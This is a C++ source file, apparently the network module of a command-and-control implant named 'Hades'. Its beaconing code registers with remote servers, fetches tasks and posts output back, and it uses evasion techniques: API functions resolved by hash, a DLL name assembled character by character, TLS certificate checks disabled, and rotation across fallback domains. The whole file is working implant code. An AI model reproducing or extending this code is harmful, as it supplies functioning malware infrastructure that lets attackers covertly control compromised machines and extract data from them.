#include "network.hpp"
#include "../hades/hades.h"
#include <stdio.h>



Network::Network(ULONG id) {
	this->HadesID = id;
	this->HttpApis = AllocMemory<HTTPAPIS>(sizeof(struct HTTPAPIS));
	if (this->HttpApis == NULL) {
		DEBUG_LOG("Failed Allocating HttpApis: %d", GetLastError());
	}
	char buf[12];
	buf[0] = 'w';
	buf[1] = 'i';
	buf[2] = 'n';
	buf[3] = 'h';
	buf[4] = 't';
	buf[5] = 't';
	buf[6] = 'p';
	buf[7] = '.';
	buf[8] = 'd';
	buf[9] = 'l';
	buf[10] = 'l';
	buf[11] = '\0';

	hades->Modules.WININET = hades->WinApis.LoadLibraryA(buf);
	if (!hades->Modules.WININET) {
		DEBUG_LOG("Failed loading Wininet: %d", GetLastError());
	}





	DECL(WinHttpGetDefaultProxyConfiguration);
	if (hades->Modules.WININET) {
		this->HttpApis->WinHttpOpen = (decltype(this->HttpApis->WinHttpOpen))GetProc(hades->Modules.WININET, HASHED_WinHttpOpen);
		this->HttpApis->WinHttpConnect = (decltype(this->HttpApis->WinHttpConnect))GetProc(hades->Modules.WININET, HASHED_WinHttpConnect);
		this->HttpApis->WinHttpCloseHandle = (decltype(this->HttpApis->WinHttpCloseHandle))GetProc(hades->Modules.WININET, HASHED_WinHttpCloseHandle);
		this->HttpApis->WinHttpOpenRequest = (decltype(this->HttpApis->WinHttpOpenRequest))GetProc(hades->Modules.WININET, HASHED_WinHttpOpenRequest);
		this->HttpApis->WinHttpSendRequest = (decltype(this->HttpApis->WinHttpSendRequest))GetProc(hades->Modules.WININET, HASHED_WinHttpSendRequest);
		this->HttpApis->WinHttpReceiveResponse = (decltype(this->HttpApis->WinHttpReceiveResponse))GetProc(hades->Modules.WININET, HASHED_WinHttpReceiveResponse);
		this->HttpApis->WinHttpQueryHeaders = (decltype(this->HttpApis->WinHttpQueryHeaders))GetProc(hades->Modules.WININET, HASHED_WinHttpQueryHeaders);
		this->HttpApis->WinHttpQueryDataAvailable = (decltype(this->HttpApis->WinHttpQueryDataAvailable))GetProc(hades->Modules.WININET, HASHED_WinHttpQueryDataAvailable);
		this->HttpApis->WinHttpReadData = (decltype(this->HttpApis->WinHttpReadData))GetProc(hades->Modules.WININET, HASHED_WinHttpReadData);
		this->HttpApis->WinHttpSetOption = (decltype(this->HttpApis->WinHttpSetOption))GetProc(hades->Modules.WININET, HASHED_WinHttpSetOption);
		this->HttpApis->WinHttpAddRequestHeaders = (decltype(this->HttpApis->WinHttpAddRequestHeaders))GetProc(hades->Modules.WININET, HASHED_WinHttpAddRequestHeaders);
		this->HttpApis->WinHttpGetIEProxyConfigForCurrentUser = (decltype(this->HttpApis->WinHttpGetIEProxyConfigForCurrentUser))GetProc(hades->Modules.WININET, HASHED_WinHttpGetIEProxyConfigForCurrentUser);
		this->HttpApis->WinHttpGetProxyForUrl = (decltype(this->HttpApis->WinHttpGetProxyForUrl))GetProc(hades->Modules.WININET, HASHED_WinHttpGetProxyForUrl);
		this->HttpApis->WinHttpDetectAutoProxyConfigUrl = (decltype(this->HttpApis->WinHttpDetectAutoProxyConfigUrl))GetProc(hades->Modules.WININET, HASHED_WinHttpDetectAutoProxyConfigUrl);
		this->HttpApis->WinHttpGetDefaultProxyConfiguration = (decltype(this->HttpApis->WinHttpGetDefaultProxyConfiguration))GetProc(hades->Modules.WININET, HASHED_WinHttpGetDefaultProxyConfiguration);
	}

	this->reqFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
		SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
	this->Heap = GetPEB()->ProcessHeap;
}




BOOL Network::DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain) {

	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	BOOL ok = FALSE;
	DWORD reqFlags = domain->isHttps ? WINHTTP_FLAG_SECURE : 0;
	WCHAR Header[64];

	DEBUG_LOG_WIDE(L"Sending Request to %ls%ls\n", domain->domain, hades->config->PostEndpoint);

	hSession = this->HttpApis->WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) goto CLEANUP;

	hConnect = this->HttpApis->WinHttpConnect(hSession, domain->domain, domain->port, 0);
	if (!hConnect) goto CLEANUP;

	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"POST", hades->config->PostEndpoint, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
	if (!hRequest) goto CLEANUP;
	swprintf_s(Header, L"X-Agent-ID: %u\r\n", this->HadesID);
	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, Header, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
		goto CLEANUP;
	}
	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, hades->config->Headers, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
		goto CLEANUP;
	}

	if (domain->isHttps) {
		if (!this->HttpApis->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags))) {
			DEBUG_LOG("Failed SetOption: %d\n", GetLastError());
			goto CLEANUP;
		}
	}
	if (!this->HttpApis->WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)toSend, len, len, 0)) {
		DEBUG_LOG("Failed Send Request: %d\n", GetLastError());
		goto CLEANUP;
	}

	ok = TRUE;

CLEANUP:
	if (hRequest) { this->HttpApis->WinHttpCloseHandle(hRequest); hRequest = NULL; }
	if (hConnect) { this->HttpApis->WinHttpCloseHandle(hConnect); hConnect = NULL; }
	if (hSession) { this->HttpApis->WinHttpCloseHandle(hSession); hSession = NULL; }

	if (!ok) {
		return FALSE;
	}

	return TRUE;
}

BOOL Network::DoGetSingle(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG id, UINT* FinalSize, UINT* capacity) {
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	BOOL ok = FALSE;
	DWORD Length = 0;
	DWORD NewCapacity = *capacity;
	const DWORD chunk = 4096;
	DWORD StatusCode = 0;
	DWORD dwSize = sizeof(StatusCode);
	DWORD BytesRead = 0;
	DWORD avail = 0;
	DWORD openFlags = domain->isHttps ? WINHTTP_FLAG_SECURE : 0;
	WCHAR Header[64];

	hSession = this->HttpApis->WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		DEBUG_LOG("Failed hSession: %d\n", GetLastError());
		goto CLEANUP;
	}
	hConnect = this->HttpApis->WinHttpConnect(hSession, domain->domain, domain->port, 0);
	if (!hConnect) {
		DEBUG_LOG("Failed hConnect: %d\n", GetLastError());
		goto CLEANUP;
	}

	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"GET", hades->config->GetEndpoint, NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, openFlags);
	if (!hRequest) {
		DEBUG_LOG("Failed hRequest: %d\n", GetLastError());
		goto CLEANUP;
	}
	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, hades->config->Headers, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
		goto CLEANUP;
	}

	swprintf_s(Header, L"X-Agent-ID: %u\r\n", this->HadesID);
	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, Header, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
		goto CLEANUP;
	}

	if (domain->isHttps) {
		if (!this->HttpApis->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags))) {
			DEBUG_LOG("Failed SetOption: %d\n", GetLastError());
			goto CLEANUP;
		}
	}

	if (!this->HttpApis->WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
		DEBUG_LOG("Failed Send Request: %d\n", GetLastError());
		goto CLEANUP;
	}

	if (!this->HttpApis->WinHttpReceiveResponse(hRequest, NULL)) {
		DEBUG_LOG("Failed Send Recieve: %d\n", GetLastError());
		goto CLEANUP;
	}


	if (!this->HttpApis->WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX,
		&StatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
		DEBUG_LOG("Failed Send QueryHeaders: %d\n", GetLastError());
		goto CLEANUP;
	}
	if (StatusCode == 204) {
		ok = TRUE;
		*FinalSize = 0;
		goto CLEANUP;
	}

	if (!this->HttpApis->WinHttpQueryDataAvailable(hRequest, &avail)) goto CLEANUP;

	if (StatusCode == 200) {
		while (TRUE) {
			if (Length + avail > NewCapacity) {
				while (Length + avail > NewCapacity) NewCapacity *= 2;
				PBYTE tmp = (PBYTE)HeapReAlloc(this->Heap, 0, *ResponseBuf, NewCapacity);
				if (!tmp) goto CLEANUP;
				*ResponseBuf = tmp;
			}

			if (!this->HttpApis->WinHttpReadData(hRequest, *ResponseBuf + Length, chunk, &BytesRead)) goto CLEANUP;
			if (BytesRead == 0) break;
			Length += BytesRead;
		}
	}
	else {
		DEBUG_LOG("Status code does not match %d\n", GetLastError());

		goto CLEANUP;
	}

	*FinalSize = Length;
	*capacity = NewCapacity;
	ok = TRUE;


CLEANUP:
	if (hRequest) { this->HttpApis->WinHttpCloseHandle(hRequest); hRequest = NULL; }
	if (hConnect) { this->HttpApis->WinHttpCloseHandle(hConnect); hConnect = NULL; }
	if (hSession) { this->HttpApis->WinHttpCloseHandle(hSession); hSession = NULL; }

	if (!ok) {
		return FALSE;
	}

	return TRUE;
}




BOOL Network::DoPost(PBYTE toSend, SIZE_T len) {
	BOOL ok = FALSE;

	for (int i = 0; i < hades->config->domaincounts && !ok; i++) {
		if (hades->config->domains[i].isDead) continue;

		for (UINT j = 0; j < MAX_RETRYS; j++) {
			if (this->DoPostSingle(toSend, len, &hades->config->domains[i])) {
				ok = TRUE;
				break;
			}

			LONGLONG delay = BASE_DELAY_MS * (1 << j);
			if (delay > MAX_DELAY_MS) delay = MAX_DELAY_MS;
			LONGLONG time = -(LONGLONG)delay * 10000;
			this->NetSleep(time);
		}

		if (!ok) {
			if (hades->config->domains[i].isSecondChance) { hades->config->domains[i].isDead = TRUE; }
			else { hades->config->domains[i].isSecondChance = TRUE; }
		}
	}

	return ok;
}


BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, ULONG id, UINT* FinalSize, UINT* capacity) {
	BOOL ok = FALSE;

	for (int i = 0; i < hades->config->domaincounts && !ok; i++) {
		if (hades->config->domains[i].isDead) continue;

		for (UINT j = 0; j < MAX_RETRYS; j++) {
			if (this->DoGetSingle(ResponseBuf, size, &hades->config->domains[i], id, FinalSize, capacity)) {
				ok = TRUE;
				break;
			}

			LONGLONG delay = BASE_DELAY_MS * (1 << j);
			if (delay > MAX_DELAY_MS) delay = MAX_DELAY_MS;
			LONGLONG time = -(LONGLONG)delay * 10000;
			this->NetSleep(time);
		}

		if (!ok) {
			if (hades->config->domains[i].isSecondChance) { hades->config->domains[i].isDead = TRUE; }
			else { hades->config->domains[i].isSecondChance = TRUE; }
		}
	}

	return ok;
}


BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {
	return this->DoPost(Data, DataLength);
}


BOOL Network::GetTask(PBYTE* OutData, SIZE_T BufSize, UINT* FinalSize, UINT* Capacity) {
	return this->DoGet(OutData, BufSize, this->HadesID, FinalSize, Capacity);
}


BOOL Network::SendOutput(PBYTE InData, SIZE_T InLen) {
	return this->DoPost(InData, InLen);
}
void Network::NetSleep(LONGLONG time) {
	LARGE_INTEGER delay;
	delay.QuadPart = time;
	hades->NtApis.NtDelayExecution(FALSE, &delay);
}

Network* g_Network = NULL;